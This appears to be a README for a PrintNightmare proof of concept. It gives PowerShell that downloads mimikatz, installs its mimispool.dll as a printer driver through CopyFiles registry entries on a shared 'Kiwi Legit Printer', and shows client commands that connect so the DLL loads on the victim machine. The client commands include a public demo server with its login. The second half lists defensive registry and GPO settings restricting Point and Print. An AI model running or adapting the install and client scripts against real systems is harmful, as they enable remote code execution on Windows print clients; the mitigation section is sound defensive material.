## PowerShell commands

### Server

#### install
```
$printerName     = 'Kiwi Legit Printer'
$system32        = $env:systemroot + '\system32'
$drivers         = $system32 + '\spool\drivers'
$RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName

Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip' -OutFile '.\mimikatz_trunk.zip'
Expand-Archive -Path '.\mimikatz_trunk.zip' -DestinationPath '.\mimikatz_trunk'

Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')

Add-PrinterDriver -Name       'Generic / Text Only'
Add-Printer       -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared

New-Item         -Path ($RegStartPrinter + '\CopyFiles')        | Out-Null

New-Item         -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Directory' -PropertyType 'String'      -Value 'x64\3'           | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null

New-Item         -Path ($RegStartPrinter + '\CopyFiles\Litchi') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Directory' -PropertyType 'String'      -Value 'W32X86\3'        | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null

New-Item         -Path ($RegStartPrinter + '\CopyFiles\Mango')  | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Directory' -PropertyType 'String'      -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Files'     -PropertyType 'MultiString' -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Module'    -PropertyType 'String'      -Value 'mimispool.dll'   | Out-Null

```

#### uninstall
```
$printerName     = 'Kiwi Legit Printer'
$system32        = $env:systemroot + '\system32'
$drivers         = $system32 + '\spool\drivers'

Remove-Printer       -Name $printerName
Start-Sleep -Seconds 2
Remove-PrinterDriver -Name 'Generic / Text Only'

Remove-Item -Force -Path ($drivers  + '\x64\3\mimispool.dll')
Remove-Item -Force -Path ($drivers  + '\W32X86\3\mimispool.dll')
Remove-Item -Force -Path ($system32 + '\mimispool.dll')

```

### Client

#### Any computer with explicit credential to `printnightmare.gentilkiwi.com`
```
$serverName  = 'printnightmare.gentilkiwi.com'
$username    = 'gentilguest'
$password    = 'password'
$printerName = 'Kiwi Legit Printer'

$fullprinterName = '\\' + $serverName + '\' + $printerName
$credential = (New-Object System.Management.Automation.PSCredential($username, (ConvertTo-SecureString -AsPlainText -String $password -Force)))

Remove-PSDrive -Force -Name 'KiwiLegitPrintServer' -ErrorAction SilentlyContinue
Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue

New-PSDrive -Name 'KiwiLegitPrintServer' -Root ('\\' + $serverName + '\print$') -PSProvider FileSystem -Credential $credential | Out-Null
Add-Printer -ConnectionName $fullprinterName

$driver = (Get-Printer -Name $fullprinterName).DriverName
Remove-Printer -Name $fullprinterName
Remove-PrinterDriver -Name $driver
Remove-PSDrive -Force -Name 'KiwiLegitPrintServer'
# mimispool still in spool\drivers

```

#### Computer in domain (single sign on with current user to print server)
```
$serverName  = 'print.lab.local'
$printerName = 'Kiwi Legit Printer'

$fullprinterName = '\\' + $serverName + '\' + $printerName

Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
Add-Printer -ConnectionName $fullprinterName

$driver = (Get-Printer -Name $fullprinterName).DriverName
Remove-Printer -Name $fullprinterName
Remove-PrinterDriver -Name $driver
# mimispool still in spool\drivers

```

## Protect
_to adapt to your environment_

**Please, do not set `RestrictDriverInstallationToAdministrators` to `0` without these settings**

### Registry

#### `.reg` file
```
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PackagePointAndPrint]
"PackagePointAndPrintOnly"=dword:00000001
"PackagePointAndPrintServerList"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PackagePointAndPrint\ListofServers]
"1"="/your really legit servers or invalid entry !/"
```

#### commands
```
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PackagePointAndPrint" /f /v PackagePointAndPrintServerList /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PackagePointAndPrint\ListofServers" /f /v 1 /t REG_SZ /d "/your really legit servers or invalid entry !/"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PackagePointAndPrint" /f /v PackagePointAndPrintOnly /t REG_DWORD /d 1
```

### Registry with real printer servers and allowing non-administrators to install package P&P drivers & printers

#### `.reg` file
```
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PackagePointAndPrint]
"PackagePointAndPrintOnly"=dword:00000001
"PackagePointAndPrintServerList"=dword:00000001

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PackagePointAndPrint\ListofServers]
"srv1.fqdn"="srv1.fqdn"
"srv2.fqdn"="srv2.fqdn"

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint]
"RestrictDriverInstallationToAdministrators"=dword:00000000
```

#### commands
```
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PackagePointAndPrint" /f /v PackagePointAndPrintServerList /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PackagePointAndPrint\ListofServers" /f /v "srv1.fqdn" /t REG_SZ /d "srv1.fqdn"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PackagePointAndPrint\ListofServers" /f /v "srv2.fqdn" /t REG_SZ /d "srv2.fqdn"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PackagePointAndPrint" /f /v PackagePointAndPrintOnly /t REG_DWORD /d 1

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" /f /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 0
```

### GPO / Local

In `Computer Configuration`, `Administrative Templates`, `Printers`, enable:
- `Only use Package Point and Print`
- `Package Point and Print - Approved servers`

![image](https://user-images.githubusercontent.com/2307945/129240741-b2a0ba14-6858-4c3f-ad07-07fa55efca29.png)

### GPO with real printer servers and allowing non-administrators to install package P&P drivers & printers

Same configuration as previously - _with real printer server names this time_ - but do not forget to add registry key `RestrictDriverInstallationToAdministrators` to `0`

![image](https://user-images.githubusercontent.com/2307945/133833820-a66b3ffd-a3aa-43a2-a1bf-14581a2a7492.png)
